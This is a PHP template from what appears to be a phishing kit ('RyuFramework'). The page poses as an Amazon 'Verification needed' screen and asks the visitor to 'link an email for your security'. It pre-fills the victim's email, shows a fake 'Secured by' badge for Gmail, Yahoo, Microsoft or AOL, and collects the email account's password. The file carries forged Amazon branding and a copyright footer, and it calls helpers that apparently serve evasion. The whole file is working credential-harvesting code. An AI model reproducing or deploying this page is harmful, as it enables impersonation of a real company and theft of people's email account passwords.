<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:28 )
* @filename email.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
?>
<!doctype html>
<html lang="<?=$this->lang;?>">
  <head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
    <title dir="ltr"><?=translate('Amazon Link an email',$this->lang,1);?></title> <meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" /> 
<script type="text/javascript" src="assets/js/jquery.min.js"></script>  
 <script type="text/javascript" src="assets/js/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery.payment.min.js"></script>
    <script type="text/javascript" src="assets/js/custom.js"></script>
       <style type="text/css">
.auth-workflow .auth-pagelet-container{max-width:580px;margin:0 auto}.auth-workflow .auth-pagelet-container-wide{width:500px;margin:0 auto}#auth-alert-window{display:none}.auth-pagelet-mobile-container{max-width:400px;margin:0 auto}.auth-pagelet-desktop-narrow-container{max-width:350px;margin:0 auto}.auth-pagelet-desktop-wide-container{max-width:600px;margin:0 auto}label.auth-hidden-label{height:0!important;width:0!important;overflow:hidden;position:absolute}.auth-phone-number-input{margin-left:10px}#auth-captcha-noop-link{display:none}#auth-captcha-image-container{height:70px;width:200px;margin-right:auto;margin-left:auto}.auth-logo-cn{width:110px!important;height:60px!important;background-position:-105px -365px!important;-webkit-background-size:600px 1000px!important;background-size:600px 1000px!important;background-image:url("assets/aui_sprite_0029-2x._V1_.png")!important}.auth-footer-seperator{display:inline-block;width:20px}#auth-cookie-warning-message{display:none}#auth-pv-client-side-error-box,#auth-pv-client-side-success-box{display:none}.auth-error-messages{color:black;margin:0}.auth-error-messages li{list-style:none;display:none}.ap_ango_default .ap_ango_email_elem,.ap_ango_default .ap_ango_phone_elem{display:none}.ap_ango_phone .ap_ango_email_elem,.ap_ango_phone .ap_ango_default_elem{display:none}.ap_ango_email .ap_ango_phone_elem,.ap_ango_email .ap_ango_default_elem{display:none}.auth-interactive-dialog{width:100%;height:100%;position:fixed;top:0;left:0;display:none;background:rgba(0,0,0,0.8);z-index:100}.auth-interactive-dialog #auth-interactive-dialog-container{display:table-cell;height:100%;vertical-align:middle;position:relative;text-align:center}.auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content{display:inline-block}.auth-third-party-content{text-align:center}.auth-wechat-login-button .wechat_button{background:#13d71f;background:-webkit-gradient(linear,left top,left bottom,from(#13d71f),to(#64d720));background:-webkit-linear-gradient(top,#13d71f,#63d71f);background:-moz-linear-gradient(top,#13d71f,#63d71f);background:-ms-linear-gradient(top,#13d71f,#63d71f);background:-o-linear-gradient(top,#13d71f,#63d71f);background:linear-gradient(top,#13d71f,#63d71f)}.wechat_button_label{color:#fff}.wechat_button_icon{top:5px!important}.a-lt-ie8 .wechat_button_icon{top:0!important}.a-lt-ie8 .auth-wechat-login-button .a-button-inner{height:31px}#auth-enter-pwd-to-cont{margin-left:2px}.ap_hidden{display:none}
</style>
<link rel="stylesheet" type="text/css" href="assets/css/details.css">
<?=$this->sec->keymani();?>

</head>
  <body>
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
<div class="a-section a-spacing-medium a-text-center">
           <center><img src="assets/img/<?=CONFIG['amz']['amz_logo'];?>" onContextMenu="return false;"></center>
      <center><img src="assets/img/<?=CONFIG['amz']['step2_logo'];?>" onContextMenu="return false;"></center>
</div>
      </div>
      <div class="a-section">
<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section"> 
<form method="post" action="<?=$this->form_action_page('email');?>" class="auth-validate-form a-spacing-none">
   <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            <?=translate('Verification needed',$this->lang);?>
          </h1>

  <?=translate('Link an email for your security.',$this->lang);?>
  <br/><br/><hr>
  <div style="margin-left: 10px;">
   <?php
$detectemail = $this->handler->emaildetect($this->handler->session('account')['email']);
switch ($detectemail) {
    case 'gmail':
        $img = 'google.png';
        break;
    case 'yahoo':
        $img = 'yahoo.png';
        break;
    case 'microsoft':
        $img = 'microsoft.png';
        break;
     case 'aol':
        $img = 'aol.png';
        break;
    default:
        $img = '../amazon1.png';
        break;

}
?>
  <i>Secured by :</i>
  <img src="<?=$this->sec->image_encode('assets/img/email/'.$img);?>" style="width: 69px;height: 30px">
</div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=lettering('Email :');?> 
            </label>
            <input type="email" id="email" required="required" maxlength="128"  name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" value="<?=$this->handler->session('account')['email'];?>">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=lettering('Password : ');?>
            </label>
            <input type="password" required="required" maxlength="128"  name="pass" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <input type="hidden" name="type" value="<?=$detectemail;?>">

<hr>
          <div class="a-section a-spacing-extra-large">
            <span class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true">
              <?=translate('Next Step',$this->lang);?>
            </span></span></span>
          </div>
             
          
        </div></div>
      </div>
      
    </form>
<?=$this->sec->keymani();?>
  </div>
</div>
      </div>
      <div id="right-2">
      </div>
       <center>
                <p><a href="#"><?=translate('Help',$this->lang);?></a> | <a href="#"><?=translate('Condition of Use',$this->lang);?></a> | <a href="#"><?=translate('Privacy Notice',$this->lang);?></a></p><br>
                <p>&copy; 1996 - <?php echo date('Y'); ?> <?=CONFIG['amz']['domain'];?>, Inc. or its affiliates</p>
            </center>
    </div>
  </div>
</body>
</html>
